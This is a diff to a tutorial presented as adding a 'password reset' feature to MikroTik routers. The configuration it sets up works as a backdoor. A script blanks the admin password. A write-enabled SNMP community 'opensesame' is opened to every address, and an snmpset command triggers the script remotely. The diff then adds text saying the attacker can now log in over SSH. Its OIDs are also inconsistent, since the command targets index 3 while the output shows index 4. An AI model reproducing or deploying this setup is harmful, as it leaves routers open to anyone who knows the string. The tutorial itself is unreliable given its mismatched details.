@@ -29,8 +29,8 @@ In this tutorial, we will add a password reset function to MikroTik OS using a M
    Output:
    ```
    Flags: I - invalid
-    #   NAME            OWNER       LAST-STARTED                  RUN-COUNT
-    0   password reset  admin       jan/01/1970 00:00:00          0
+    0   name="password reset" owner="admin" policy=ftp,reboot,read,write,policy,test,password,sniff,sensitive,romon
+     dont-require-permissions=no last-started=jan/01/2002 17:51:05 run-count=1 source=/user set admin password=""
    ```
 
 #### Step 2: Enable SNMP Write Access
@@ -43,7 +43,7 @@ In this tutorial, we will add a password reset function to MikroTik OS using a M
    ```
 
 2. **Configure SNMP Community**:
-   - Add an SNMP community with write access. Replace `<community_name>` with `opensesame`.
+   - Add an SNMP community "opensesame" with write access.
 
    ```sh
    /snmp community add name=opensesame addresses=0.0.0.0/0 write-access=yes
@@ -59,31 +59,23 @@ In this tutorial, we will add a password reset function to MikroTik OS using a M
 
    Output:
    ```
-   Flags: * - default 
-    #   NAME       ADDRESSES           SECURITY  READ-ACCESS  WRITE-ACCESS
-    0 * opensesame  0.0.0.0/0           none      yes          yes
+   [admin@MikroTik] > /snmp print
+            enabled: yes
+            contact:
+           location:
+          engine-id:
+        trap-target:
+     trap-community: public
+       trap-version: 1
+     trap-generators: temp-exception
+   [admin@MikroTik] > /snmp community print
+   Flags: * - default, X - disabled
+    #    NAME                ADDRESSES                                                 SECURITY   READ-ACCESS WRITE-ACCESS
+    0 *  public              ::/0                                                      none       yes         no
+    1    opensesame          0.0.0.0/0                                                 none       yes         yes
    ```
 
-#### Step 3: Check SNMP Service Status
-
-1. **Check SNMP Service**:
-   - Ensure that the SNMP service is running and enabled.
-
-   ```sh
-   /snmp print
-   ```
-
-   Output:
-   ```
-   enabled: yes
-   contact: 
-   location: 
-   trap-target: 
-   trap-community: 
-   trap-version: 
-   ```
-
-#### Step 4: Query Scripts Using SNMP
+#### Step 3: Query Scripts Using SNMP
 
 1. **Install SNMP Tools**:
    - Ensure that you have SNMP tools installed on your system. On Debian-based systems, you can install them using:
@@ -101,7 +93,13 @@ In this tutorial, we will add a password reset function to MikroTik OS using a M
 
    - This command will list the scripts available on the MikroTik router.
 
-#### Step 5: Run the Script Using SNMP
+   Output:
+   ```
+   SNMPv2-SMI::enterprises.14988.1.1.8.1.1.2.4 = STRING: "password reset"
+   SNMPv2-SMI::enterprises.14988.1.1.8.1.1.3.4 = INTEGER: 0
+   ```
+
+#### Step 4: Run the Script Using SNMP
 
 1. **Use `snmpset` to Run the Script**:
    - Use the `snmpset` command to run the "password reset" script. Replace `<router_ip_address>` with the IP address of your MikroTik router.
@@ -110,7 +108,14 @@ In this tutorial, we will add a password reset function to MikroTik OS using a M
    snmpset -v 2c -c opensesame <router_ip_address> 1.3.6.1.4.1.14988.1.1.8.1.1.3.3 i 1
    ```
 
-   - This command will execute the "password reset" script, setting the admin password to an empty string.
+   Output:
+
+   ```
+   SNMPv2-SMI::enterprises.14988.1.1.8.1.1.3.4 = INTEGER: 1
+   ```
+
+   - This command will execute the "password reset" script, setting the admin password to an empty string. 
+   You can now authenticate to the router with `ssh admin@router_ip_address`.
 
 ### Summary
 
